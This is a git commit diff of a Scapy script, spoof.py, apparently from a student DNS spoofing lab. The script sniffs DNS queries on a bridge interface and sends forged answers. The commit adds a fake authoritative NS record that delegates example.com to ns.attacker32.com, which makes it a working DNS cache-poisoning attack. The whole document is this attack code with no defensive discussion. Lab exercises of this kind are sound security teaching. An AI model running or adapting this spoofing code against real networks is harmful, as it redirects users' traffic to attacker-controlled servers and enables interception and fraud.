3b2b839358f2ca9caa5e9d9c00302f5d8006af5e
hanhnguyengiahan <hanhhan2705@gmail.com>
2024-10-31 12:43:59 +1100

    fix the dns packet

--- Labsetup/spoof.py
+++ Labsetup/spoof.py
@@ -7,24 +7,23 @@ NS_NAME = "example.com"
 def spoof_dns(pkt):
     if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
         print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
-        # The IP adress of the local DNS server that I want to spoof
-        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)  # Create an IP object
-        udp = UDP(dport=pkt[UDP].sport, sport=53)  # Create a UDP object
-        Anssec = DNSRR(rrname=NS_NAME, type='A', rdata='10.9.0.5', ttl=259200)  # Create an answer record
-        dns = DNS(
+        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)  # Create an IP object
+        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)  # Create a UDP object
+        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', rdata='1.2.3.5', ttl=259200)  # Create an answer record
+        NSsec = DNSRR(rrname=NS_NAME, type='NS', rdata='ns.attacker32.com', ttl=259200)  # Create an answer record
+        DNSpkt = DNS(
             id=pkt[DNS].id,
-            qr=1,
             aa=1,
-            rd=pkt[DNS].rd,
+            rd=0,
             qdcount=1,
             ancount=1,
-            nscount=0,
-            arcount=0,
+            nscount=1,
             qd=pkt[DNS].qd,
-            an=Anssec
+            an=Anssec,
+            ns=NSsec
          ) # Create a DNS object
-        spoofpkt = ip / udp / dns  # Assemble the spoofed DNS packet
+        spoofpkt = IPpkt / UDPpkt / DNSpkt  # Assemble the spoofed DNS packet
         send(spoofpkt)
 
-myFilter = "udp port 53"  # Set the filter
-pkt = sniff(iface='br-f0294016680f', filter=myFilter, prn=spoof_dns)
+myFilter = "udp port 53"
+pkt = sniff(iface='br-3e931af5a939', filter=myFilter, prn=spoof_dns)
